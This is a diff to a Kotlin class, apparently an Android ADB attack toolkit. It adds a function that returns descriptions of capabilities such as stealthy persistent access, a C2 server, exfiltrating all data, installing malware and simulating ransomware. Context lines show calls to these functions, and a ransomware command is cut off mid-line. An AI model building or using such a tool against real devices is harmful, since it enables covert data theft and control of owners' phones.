@@ -202,6 +202,7 @@ class ADBBase(private val logger: Logger = Logger()) {
         listFiles("/sdcard/Download")
         trackIPAddress()
         startC2Server()
+        logger.description(getFunctionDescription("prepareAttack"))
     }
 
     private suspend fun establishPersistentAccess() {
@@ -328,3 +329,30 @@ class ADBBase(private val logger: Logger = Logger()) {
     suspend fun simulateRansomware() {
         executeAdbBatch(
             listOf("input keyevent 26", "shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message
+    }
+
+    fun getFunctionDescription(functionName: String): String {
+        return when (functionName) {
+            "prepareAttack" -> "Prepare Attack: Enable stealth, persistent access, and start C2 server."
+            "stealAllData" -> "Steal All Data: Exfiltrate all accessible data to /sdcard/stolen_data."
+            "dumpSystemInfo" -> "Dump System Info: Dump system information to /sdcard/system_info."
+            "simulateRansomware" -> "Simulate Ransomware: Simulate ransomware on the device."
+            "installMalware" -> "Install Malware: Install malware from a specified APK path."
+            "executeShellCommand" -> "Execute Shell Command: Execute a shell command on the device."
+            "listFiles" -> "List Files: List files in a specified directory."
+            "pullFile" -> "Pull File: Pull a file from the device to the local machine."
+            "pushFile" -> "Push File: Push a file from the local machine to the device."
+            "installApk" -> "Install APK: Install an APK on the device."
+            "uninstallApp" -> "Uninstall App: Uninstall an application from the device."
+            "clearAppData" -> "Clear App Data: Clear data for a specified application."
+            "rebootDevice" -> "Reboot Device: Reboot the device."
+            "takeScreenshot" -> "Take Screenshot: Take a screenshot and save it to the device."
+            "getDeviceInfo" -> "Get Device Info: Retrieve device information such as model, serial number, and Android version."
+            "readLogcat" -> "Read Logcat: Read the logcat output from the device."
+            "checkDeviceStatus" -> "Check Device Status: Check the ADB accessibility and root status of the device."
+            "startC2Server" -> "C2 - Start Server: Start the C2 server (already integrated in Prepare Attack)."
+            "stopC2Server" -> "C2 - Stop Server: Stop the C2 server."
+            else -> "Unknown function: $functionName"
+        }
+    }
+}
